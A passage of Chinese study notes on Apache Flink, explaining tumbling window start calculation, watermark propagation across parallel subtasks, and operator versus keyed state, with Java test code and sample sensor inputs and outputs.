class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718211,34</span><br><span class="line">sensor_1,1547718212,31.9</span><br><span class="line">sensor_1,1547718212,31.9</span><br><span class="line">sensor_1,1547718212,31.9</span><br><span class="line">sensor_1,1547718212,31.9</span><br></pre></td></tr></table></figure><p>输出</p><p><em>注意：上面输入全部输入后，才突然有下面4条输出！</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">minTemp:2&gt; SensorReading&#123;id=&#x27;sensor_10&#x27;, timestamp=1547718205, temperature=38.1&#125;</span><br><span class="line">minTemp:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">minTemp:4&gt; SensorReading&#123;id=&#x27;sensor_7&#x27;, timestamp=1547718202, temperature=6.7&#125;</span><br><span class="line">minTemp:3&gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br></pre></td></tr></table></figure><p>####### 分析</p><ol><li><p> <strong>计算窗口起始位置Start和结束位置End</strong><br>从<code>TumblingProcessingTimeWindows</code>类里的<code>assignWindows</code>方法，我们可以得知窗口的起点计算方法如下： <img src="https://g.yuque.com/gr/latex?%E7%AA%97%E5%8F%A3%E8%B5%B7%E7%82%B9start%20=%20timestamp%20-%20(timestamp%20-offset+WindowSize)%20%5C%25%20WindowSize%0A###card=math&code=%E7%AA%97%E5%8F%A3%E8%B5%B7%E7%82%B9start%20%3D%20timestamp%20-%20%28timestamp%20-offset%2BWindowSize%29%20%5C%25%20WindowSize%0A&id=p3BYZ"><br>由于我们没有设置offset，所以这里<code>start=第一个数据的时间戳1547718199-(1547718199-0+15)%15=1547718195</code><br>计算得到窗口初始位置为<code>Start = 1547718195</code>，那么这个窗口理论上本应该在1547718195+15的位置关闭，也就是<code>End=1547718210</code>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Collection&lt;TimeWindow&gt; <span class="title">assignWindows</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  Object element, <span class="keyword">long</span> timestamp, WindowAssignerContext context)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">long</span> now = context.getCurrentProcessingTime();</span><br><span class="line">  <span class="keyword">if</span> (staggerOffset == <span class="keyword">null</span>) &#123;</span><br><span class="line">    staggerOffset =</span><br><span class="line">      windowStagger.getStaggerOffset(context.getCurrentProcessingTime(), size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">long</span> start =</span><br><span class="line">    TimeWindow.getWindowStartWithOffset(</span><br><span class="line">    now, (globalOffset + staggerOffset) % size, size);</span><br><span class="line">  <span class="keyword">return</span> Collections.singletonList(<span class="keyword">new</span> TimeWindow(start, start + size));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跟踪 getWindowStartWithOffset 方法得到TimeWindow的方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">getWindowStartWithOffset</span><span class="params">(<span class="keyword">long</span> timestamp, <span class="keyword">long</span> offset, <span class="keyword">long</span> windowSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> timestamp - (timestamp - offset + windowSize) % windowSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> <strong>计算修正后的Window输出结果的时间</strong><br>测试代码中Watermark设置的<code>maxOutOfOrderness</code>最大乱序程度是2s，所以实际获取到End+2s的时间戳数据时（达到Watermark），才认为Window需要输出计算的结果（不关闭，因为设置了允许迟到1min）</p></li></ol><p><strong>所以实际应该是1547718212的数据到来时才触发Window输出计算结果。</strong>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// BoundedOutOfOrdernessTimestampExtractor.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BoundedOutOfOrdernessTimestampExtractor</span><span class="params">(Time maxOutOfOrderness)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (maxOutOfOrderness.toMilliseconds() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(</span><br><span class="line">      <span class="string">&quot;Tried to set the maximum allowed &quot;</span></span><br><span class="line">      + <span class="string">&quot;lateness to &quot;</span></span><br><span class="line">      + maxOutOfOrderness</span><br><span class="line">      + <span class="string">&quot;. This parameter cannot be negative.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.maxOutOfOrderness = maxOutOfOrderness.toMilliseconds();</span><br><span class="line">  <span class="keyword">this</span>.currentMaxTimestamp = Long.MIN_VALUE + <span class="keyword">this</span>.maxOutOfOrderness;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Watermark <span class="title">getCurrentWatermark</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// this guarantees that the watermark never goes backwards.</span></span><br><span class="line">  <span class="keyword">long</span> potentialWM = currentMaxTimestamp - maxOutOfOrderness;</span><br><span class="line">  <span class="keyword">if</span> (potentialWM &gt;= lastEmittedWatermark) &#123;</span><br><span class="line">    lastEmittedWatermark = potentialWM;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Watermark(lastEmittedWatermark);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li> 为什么上面输入中，最后连续四条相同输入，才触发Window输出结果？ </li></ol><ul><li><strong>Watermark会向子任务广播</strong> <ul><li>我们在map才设置Watermark，map根据Rebalance轮询方式分配数据。所以前4个输入分别到4个slot中，4个slot计算得出的Watermark不同（分别是1547718199-2，1547718201-2，1547718202-2，1547718205-2）</li></ul></li><li><strong>Watermark传递时，会选择当前接收到的最小一个作为自己的Watermark</strong> <ul><li>前4次输入中，有些map子任务还没有接收到数据，所以其下游的keyBy后的slot里watermark就是<code>Long.MIN_VALUE</code>（因为4个上游的Watermark广播最小值就是默认的<code>Long.MIN_VALUE</code>）</li><li>并行度4，在最后4个相同的输入，使得Rebalance到4个map子任务的数据的<code>currentMaxTimestamp</code>都是1547718212，经过<code>getCurrentWatermark()</code>的计算（<code>currentMaxTimestamp-maxOutOfOrderness</code>），4个子任务都计算得到watermark=1547718210，4个map子任务向4个keyBy子任务广播<code>watermark=1547718210</code>，使得keyBy子任务们获取到4个上游的Watermark最小值就是1547718210，然后4个KeyBy子任务都更新自己的Watermark为1547718210。</li></ul></li><li> <strong>根据Watermark的定义，我们认为&gt;=Watermark的数据都已经到达。由于此时watermark &gt;= 窗口End，所以Window输出计算结果（4个子任务，4个结果）。</strong> </li></ul><h5 id="窗口起始点和偏移量"><a href="#窗口起始点和偏移量" class="headerlink" title="窗口起始点和偏移量"></a>窗口起始点和偏移量</h5><blockquote><p><a href="https://juejin.cn/post/6844904110941011976">flink-Window Assingers(窗口分配器)中offset偏移量</a></p></blockquote><pre><code>时间偏移一个很大的用处是用来调准非0时区的窗口，例如:在中国你需要指定一个8小时的时间偏移。</code></pre><h3 id="Flink状态管理"><a href="#Flink状态管理" class="headerlink" title="Flink状态管理"></a>Flink状态管理</h3><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108430338">Flink_Flink中的状态</a></p><p><a href="https://zhuanlan.zhihu.com/p/104171679">Flink状态管理详解：Keyed State和Operator List State深度解析</a>    &lt;=    不错的文章，建议阅读</p></blockquote><ul><li>算子状态（Operator State）</li><li>键控状态（Keyed State）</li><li>状态后端（State Backends）</li></ul><h4 id="状态概述"><a href="#状态概述" class="headerlink" title="状态概述"></a>状态概述</h4><p><img src="https://img-blog.csdnimg.cn/20200906125916475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=HPdLR&originHeight=307&originWidth=745&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>由一个任务维护，并且用来计算某个结果的所有数据，都属于这个任务的状态</li><li>可以认为任务状态就是一个本地变量，可以被任务的业务逻辑访问</li><li><strong>Flink 会进行状态管理，包括状态一致性、故障处理以及高效存储和访问，以便于开发人员可以专注于应用程序的逻辑</strong></li></ul><hr><ul><li><strong>在Flink中，状态始终与特定算子相关联</strong></li><li>为了使运行时的Flink了解算子的状态，算子需要预先注册其状态</li></ul><p><strong>总的来说，有两种类型的状态：</strong></p><ul><li><strong>算子状态（Operator State）</strong> <ul><li>算子状态的作用范围限定为<strong>算子任务</strong>（也就是不能跨任务访问）</li></ul></li><li><strong>键控状态（Keyed State）</strong> <ul><li>根据输入数据流中定义的键（key）来维护和访问</li></ul></li></ul><h4 id="算子状态-Operator-State"><a href="#算子状态-Operator-State" class="headerlink" title="算子状态 Operator State"></a>算子状态 Operator State</h4><p><img src="https://img-blog.csdnimg.cn/20200906173949148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=bopoS&originHeight=384&originWidth=753&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 算子状态的作用范围限定为算子任务，同一并行任务所处理的所有数据都可以访问到相同的状态。 </li><li> 状态对于<strong>同一任务</strong>而言是共享的。（<strong>不能跨slot</strong>） </li><li> 状态算子不能由相同或不同算子的另一个任务访问。 </li></ul><h5 id="算子状态数据结构"><a href="#算子状态数据结构" class="headerlink" title="算子状态数据结构"></a>算子状态数据结构</h5><ul><li>列表状态(List state) <ul><li>将状态表示为一组数据的列表</li></ul></li><li>联合列表状态(Union list state) <ul><li>也将状态表示未数据的列表。它与常规列表状态的区别在于，在发生故障时，或者从保存点(savepoint)启动应用程序时如何恢复</li></ul></li><li>广播状态(Broadcast state) <ul><li>如果一个算子有多项任务，而它的每项任务状态又都相同，那么这种特殊情况最适合应用广播状态</li></ul></li></ul><h5 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h5><p>实际一般用算子状态比较少，一般还是键控状态用得多一点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.checkpoint.ListCheckpointed;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/2 4:05 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTest1_OperatorState</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket文本流</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个有状态的map操作，统计当前分区数据个数</span></span><br><span class="line">    SingleOutputStreamOperator&lt;Integer&gt; resultStream = dataStream.map(<span class="keyword">new</span> MyCountMapper());</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 自定义MapFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyCountMapper</span> <span class="keyword">implements</span> <span class="title">MapFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Integer</span>&gt;, <span class="title">ListCheckpointed</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 定义一个本地变量，作为算子状态</span></span><br><span class="line">    <span class="keyword">private</span> Integer count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      count++;</span><br><span class="line">      <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">snapshotState</span><span class="params">(<span class="keyword">long</span> checkpointId, <span class="keyword">long</span> timestamp)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> Collections.singletonList(count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">restoreState</span><span class="params">(List&lt;Integer&gt; state)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">for</span> (Integer num : state) &#123;</span><br><span class="line">        count += num;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入(本地开启socket后输入)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,35.8</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h4 id="键控状态-Keyed-State"><a href="#键控状态-Keyed-State" class="headerlink" title="键控状态 Keyed State"></a>键控状态 Keyed State</h4><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108430338">Flink_Flink中的状态</a></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906182710217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=CEwwJ&originHeight=395&originWidth=1022&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 键控状态是根据输入数据流中定义的键（key）来维护和访问的。 </li><li> <strong>Flink 为每个key维护一个状态实例，并将具有相同键的所有数据，都分区到同一个算子任务中，这个任务会维护和处理这个key对应的状态。</strong> </li><li> <strong>当任务处理一条数据时，他会自动将状态的访问范围限定为当前数据的key</strong>。 </li></ul><h5 id="键控状态数据结构"><a href="#键控状态数据结构" class="headerlink" title="键控状态数据结构"></a>键控状态数据结构</h5><ul><li>值状态(value state) <ul><li>将状态表示为单个的值</li></ul></li><li>列表状态(List state) <ul><li>将状态表示为一组数据的列表</li></ul></li><li>映射状态(Map state) <ul><li>将状态表示为一组key-value对</li></ul></li><li><strong>聚合状态(Reducing state &amp; Aggregating State)</strong> <ul><li>将状态表示为一个用于聚合操作的列表</li></ul></li></ul><h5 id="测试代码-2"><a href="#测试代码-2" class="headerlink" title="测试代码"></a>测试代码</h5><p><img src="https://img-blog.csdnimg.cn/20200906183806458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=AyZr1&originHeight=640&originWidth=1134&originalType=binary&ratio=1&status=done&style=none"></p><p><em>注：声明一个键控状态，一般在算子的open()中声明，因为运行时才能获取上下文信息</em></p><ul><li> java测试代码  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.RichMapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/2 5:41 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTest2_KeyedState</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度 = 1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 从本地socket读取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用自定义map方法，里面使用 我们自定义的Keyed State</span></span><br><span class="line">    DataStream&lt;Integer&gt; resultStream = dataStream</span><br><span class="line">      .keyBy(SensorReading::getId)</span><br><span class="line">      .map(<span class="keyword">new</span> MyMapper());</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 自定义map富函数，测试 键控状态</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMapper</span> <span class="keyword">extends</span> <span class="title">RichMapFunction</span>&lt;<span class="title">SensorReading</span>,<span class="title">Integer</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        Exception in thread &quot;main&quot; java.lang.IllegalStateException: The runtime context has not been initialized.</span></span><br><span class="line">    <span class="comment">//        ValueState&lt;Integer&gt; valueState = getRuntimeContext().getState(new ValueStateDescriptor&lt;Integer&gt;(&quot;my-int&quot;, Integer.class));</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ValueState&lt;Integer&gt; valueState;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其它类型状态的声明</span></span><br><span class="line">    <span class="keyword">private</span> ListState&lt;String&gt; myListState;</span><br><span class="line">    <span class="keyword">private</span> MapState&lt;String, Double&gt; myMapState;</span><br><span class="line">    <span class="keyword">private</span> ReducingState&lt;SensorReading&gt; myReducingState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      valueState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Integer&gt;(<span class="string">&quot;my-int&quot;</span>, Integer.class));</span><br><span class="line"></span><br><span class="line">      myListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;String&gt;(<span class="string">&quot;my-list&quot;</span>, String.class));</span><br><span class="line">      myMapState = getRuntimeContext().getMapState(<span class="keyword">new</span> MapStateDescriptor&lt;String, Double&gt;(<span class="string">&quot;my-map&quot;</span>, String.class, Double.class));</span><br><span class="line">      <span class="comment">//            myReducingState = getRuntimeContext().getReducingState(new ReducingStateDescriptor&lt;SensorReading&gt;())</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里就简单的统计每个 传感器的 信息数量</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 其它状态API调用</span></span><br><span class="line">      <span class="comment">// list state</span></span><br><span class="line">      <span class="keyword">for</span>(String str: myListState.get())&#123;</span><br><span class="line">        System.out.println(str);</span><br><span class="line">      &#125;</span><br><span class="line">      myListState.add(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">      <span class="comment">// map state</span></span><br><span class="line">      myMapState.get(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">      myMapState.put(<span class="string">&quot;2&quot;</span>, <span class="number">12.3</span>);</span><br><span class="line">      myMapState.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">      <span class="comment">// reducing state</span></span><br><span class="line">      <span class="comment">//            myReducingState.add(value);</span></span><br><span class="line"></span><br><span class="line">      myMapState.clear();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Integer count = valueState.value();</span><br><span class="line">      <span class="comment">// 第一次获取是null，需要判断</span></span><br><span class="line">      count = count==<span class="keyword">null</span>?<span class="number">0</span>:count;</span><br><span class="line">      ++count;</span><br><span class="line">      valueState.update(count);</span><br><span class="line">      <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h5 id="场景测试"><a href="#场景测试" class="headerlink" 